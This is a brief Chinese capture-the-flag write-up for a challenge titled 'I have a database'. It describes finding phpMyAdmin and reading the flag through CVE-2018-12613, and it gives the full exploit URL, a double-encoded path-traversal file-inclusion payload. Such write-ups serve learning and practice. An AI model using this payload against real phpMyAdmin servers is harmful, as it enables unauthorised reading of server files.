# 我有一个数据库
没啥好说的，爆破出phpmyadmin（本来是想在phpinfo中提示的，但好像有点问题？）
然后问度娘poc，找到CVE-2018-12613可以用。
拿到POC直接打
`http://yourip:port/index.php?target=db_sql.php%253f/../../../../../../../../flag`